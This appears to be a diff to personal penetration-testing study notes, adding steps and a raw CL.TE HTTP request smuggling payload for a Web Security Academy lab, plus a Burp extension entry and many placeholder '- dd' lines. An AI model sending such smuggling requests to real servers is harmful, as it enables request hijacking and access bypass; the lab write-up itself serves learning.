@@ -79,7 +79,7 @@
 - JS Link Finder: Scanning js files for endpoint links [API testing]
 - Content Type Converter: JSON to XML; XMl to JSON; Body param to JSON; Body param to XML [API testing]
 - Param Miner: identifies hidden, unlinked parameters.  useful for finding web cache poisoning vulnerabilities [API testing, Web Cache Poison]
-- Clic
+- HTTP request smuggler: scan request smuggling vulnerabilities > right clikc on the a request and click 'Launch smuggle probe', then watch the extension's output pane. [HTTP request smuggler]
   
 ## SQL Injection
 **How to detect**     
@@ -3886,6 +3886,11 @@ LLM -> API: create_email_forwarding_rule('peter')
   - The ambiguous message sent by the attacker is interpreted by the back-end server as two individual HTTP requests.
   - The second request is designed to perform a malicious action, which cannot be accomplished by the first request.  
 - Vulnerable HTTP feature: Keep Alive mode, Pipelined queries, Chunked queries and responses
+- 4 steps
+  - pick an endpoint
+  - prepare repeater for request smuggling
+  - detect the CL.TE vulnerability
+  - confirm the CL.TE vulnerability
 
 **Attack types**
 - https://www.cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling
@@ -3899,6 +3904,50 @@ LLM -> API: create_email_forwarding_rule('peter')
 - Configure the front-end server to normalize ambiguous requests  
 
 ### HTTP request smuggling Lab
+**Burp suite no: lab supports HTTP/2, switch protocols in Burp Repeater from the Request attributes section of the Inspector panel**  
+
+- HTTP request smuggling, basic CL.TE vulnerability
+  - Purpose: smuggle a request to the back-end server so that the next request processed by the back-end server appears to use the method GPOST
+  - Downgrade HTTP protocol to HTTP/1.1
+    send repeater for GET / > under Burp Inspector pane > **Request attributes > select "HTTP/1" tab** > `GET / HTTP/2`
+  - Change requeest method to POST  `POST /`
+  - Disable automatic update of content-length > Burp setting > **uncheck "update Content-Length"**
+  - show non-printable characters > click the tab "\n" on repeater pane
+  - Exploit 
+    ```
+    POST / HTTP/1.1
+    Host: 0a920089043f493082a106b80066006f.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 6
+    Transfer-Encoding: chunked
+
+    0
+
+    G
+    ```
+ - second request throw response "Unrecognized method GPOST"
+- dd
+- dd
+- dd
+- dd
+- dd
+- dd
+- dd
+- dd 
+- dd
+- dd
+- dd
+- dd
+- dd
+- dd
+- dd
+- dd
+- dd
+- dd 
+- dd
+- dd
+- dd
+
 
 ## OAuth Authentication
 Content for OAuth Authentication...
